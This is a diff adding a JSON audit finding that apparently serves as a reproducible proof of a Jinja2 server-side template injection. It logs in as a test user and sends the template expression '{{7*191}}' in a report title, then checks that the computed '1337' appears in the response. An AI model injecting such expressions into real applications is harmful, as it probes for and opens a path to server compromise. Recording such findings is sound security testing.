@@ -1,0 +1,5 @@
+{"finding": "F-4",
+ "description": "Jinja2 evaluates an expression placed in the report title. The marker 1337 is computed by the server (7*191); it is not in the request.",
+ "steps": [{"name": "login as alice", "method": "POST", "path": "/login", "form": {"email": "alice@example.test", "password": "alice-test-pw"}, "expect_status": 302},
+   {"name": "render report", "method": "GET", "path": "/invoices/report", "params": {"title": "{{7*191}}"}}],
+ "proof": {"type": "marker_in_response", "step": "render report", "marker": "<h1>1337</h1>"}}
